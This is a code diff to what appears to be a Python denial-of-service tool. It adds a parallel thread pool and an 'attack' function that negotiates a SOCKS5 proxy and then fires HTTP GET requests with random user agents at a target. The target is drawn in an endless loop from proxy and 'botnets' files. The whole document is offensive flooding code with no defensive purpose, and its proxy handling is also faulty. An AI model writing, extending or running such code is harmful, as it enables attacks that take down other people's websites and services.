@@ -5,6 +5,7 @@ import threading
 import requests
 import time
 import urllib.parse
+from multiprocessing.dummy import Pool as ThreadPool
 
 credit = """
 \033[1;36m
@@ -172,11 +173,33 @@ def attack_ssl_tls(target_url, target_port, socks5_proxy):
         except:
             pass
 
+def attack(target_url, target_port, socks5_proxy):
+    try:
+        socks5_host, socks5_port = socks5_proxy.split(":")
+        socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socks5_socket.settimeout(3)
+        socks5_socket.connect((socks5_host, int(socks5_port)))
+        socks5_socket.sendall(b"\x05\x01\x00")
+        socks5_response = socks5_socket.recv(2)
+        if socks5_response == b"\x05\x00":
+            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            target_socket.settimeout(3)
+            target_socket.connect((target_url, target_port))
+            useragent = random.choice(useragents)
+            headers = f"GET / HTTP/1.1\r\nHost: {target_url}\r\nUser-Agent: {useragent}\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
+            target_socket.sendall(headers.encode())
+            target_socket.close()
+        socks5_socket.close()
+    except:
+        pass
+
 def start_attack():
     with open(socks5_file, "r") as f:
         socks5_proxies = f.read().splitlines()
     with open(botnets_file, "r") as f:
         botnet_ips = f.read().splitlines()
+        
+        pool = ThreadPool(4)  # Number of threads for parallel attacks
         
     while True:
         target_url = random.choice(botnet_ips)
